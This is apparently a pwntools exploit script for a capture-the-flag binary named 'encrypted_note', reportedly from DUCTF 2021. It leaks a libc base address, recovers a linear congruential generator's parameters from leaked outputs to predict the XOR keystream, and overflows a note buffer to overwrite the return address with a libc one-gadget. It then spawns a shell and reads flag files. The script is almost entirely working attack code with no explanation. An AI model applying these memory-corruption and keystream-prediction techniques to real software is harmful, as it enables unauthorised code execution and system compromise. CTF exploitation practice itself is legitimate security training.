from pwn import *

elf = ELF("./encrypted_note")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.33.so")
#libc = elf.libc

def sa(s, d):
	target.sendafter(s, d)

def write_note(data):
	sa("> ", b"1")
	target.sendafter(": ", data)

def read_note():
	sa("> ", b"2")

def append(data):
	sa("> ", b"3")
	target.sendafter(": ", data)

def dump_data():
	write_note("\x41"*8 + "\x00")
	read_note()
	leak = target.recvline().strip()
	leak = b"".join(reversed([leak[i:i+2] for i in range(0, len(leak), 2)]))
	leak = int(leak, 0x10)
	#print(hex(leak ^ 0x4141414141414141))
	return (leak ^ 0x4141414141414141)


# Crypto functions written by @rey
from Crypto.Util.number import inverse, GCD
from functools import reduce

def get_inc(states, m, n):
    s1 = states[0]
    s2 = states[1]
    return ( s2 - m * s1) % n

def get_mult(states, n):
    s1 = states[0]
    s2 = states[1]
    s3 = states[2]
    m = ((s3 - s2) * inverse(s2-s1, n)) % n
    return m

def get_mod(states):
    diffs = [b - a for a, b in zip(states, states[1:])]
    z = [a*c - b**2 for a, b, c in zip(diffs, diffs[1:], diffs[2:])]
    n = reduce(GCD, z)
    return n

def predict_state(curr_state, n, m, c):
    p = (m * curr_state + c) % n
    return p

#context.log_level = "ERROR"
while True:
	print("+", end='')
	#target = remote("pwn-2021.duc.tf", 31908)
	#target = remote("localhost", 1337)
	#target = elf.process()
	target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
	#'''
	try:
		read_note()
		leak = target.recvline().strip()
		leak = int(b"".join(reversed([leak[i:i+2] for i in range(0, len(leak), 2)])), 0x10)
		#log.info("_IO_file_jumps: " + hex(leak))
		#libc_base = leak - libc.sym['_IO_file_jumps']
		libc_base = leak - 0x1ed4a0
		log.info("LIBC Base: " + hex(libc_base))
		pop_rdi = 0x0000000000026b72
		#'''


		states = [0x7d720cf248efceb5, 0x9d67b9dae8a12d7a, 0x2e189b780c6d0105, 0xe8818a7e03f802a, 0x5ad04da1a5317955, 0xb3e394ac93deecda]

		for i in range(6):
		    states[i] = dump_data()

		states = states[2:5]

		n = 2**64 #get_mod(states)
		#print("n:", n)

		m = get_mult(states, n)
		#print("m:", m)

		c = get_inc(states, m, n)
		#print("c:", c)

		pred = predict_state(states[-1], n, m, c)
		#print("predicted:", hex(pred))

		#------------------------------------------------------------------------------------------------------------------------------------
		payload = b""
		for i in range(9):
			pred = predict_state(pred, n, m, c)
			payload += p64(0x4141414141414141 ^ pred)
		pred = predict_state(pred, n, m, c)
		payload += p64(0x41 ^ pred)
		write_note(payload + b"\x00")

		print("Checkpoint 1 cleared")
		for i in range(2):
			pred = predict_state(pred, n, m, c)
			append(p64(0x41ff414141414141 ^ pred))
			#print(".", end='')

		'''
		read_note()
		target.recvuntil(b"41"*0x50)
		target.recv(16)
		leak_can = target.recv(16)
		leak_can = b"".join(reversed([leak_can[i:i+2] for i in range(0, len(leak_can), 2)]))
		canary = int(leak_can, 0x10)
		canary = canary & 0xffffffffffffff00
		log.info("Canary: " + hex(canary))
		#'''

		pred = predict_state(pred, n, m, c)
		append(p64(((0x6161) << 0) ^ pred))

		pred = predict_state(pred, n, m, c)
		append(p64(((libc_base + 0xde78c) << 0) ^ pred))	# remote
		#append(p64(((libc_base + 0xde78f) << 0) ^ pred))	# remote
		#append(p64(((libc_base + 0xe6c81) << 0) ^ pred))	# local

		pred = predict_state(pred, n, m, c)
		append(p64(((0x0) << 0) ^ pred))

		payload = b""
		for i in range(9):
			pred = predict_state(pred, n, m, c)
			payload += p64(0x4141414141414141 ^ pred)
		pred = predict_state(pred, n, m, c)
		payload += p64(0x42 ^ pred)
		write_note(payload + b"\x00")

		pred = predict_state(pred, n, m, c)
		append(p64(0x0045444444444444 ^ pred))

		print("Checkpoint 2 cleared")
		pred = predict_state(pred, n, m, c)
		while pred & 0xff00000000000000 != 0:
			append(p64(0x43ff434343434300 ^ pred))
			pred = predict_state(pred, n, m, c)
			print(".", end='')

		#gdb.attach(target, 'b read_note\nc\nfinish\nx/20gx $rsp')

		append(p64(0x00ff434343434343 ^ pred))

		#'''
		read_note()
		target.sendline(b"0")

		try:
			#'''
			target.sendline(b"echo whoamiT")
			target.sendline(b"cat fl*")
			target.sendline(b"cat fl*")
			target.sendline(b"cat fl*")
			target.sendline(b"cat fl*")
			target.sendline(b"cat fl*")
			target.sendline(b"cat fl*")
			target.sendline(b"cat fl*")

			print("\nFinal Checkpoint!")
			print(target.recvuntil("whoamiT"))
			#'''
			target.interactive()
			
			break
		except:
			print("Kat gayaa :(")
	except:
		pass
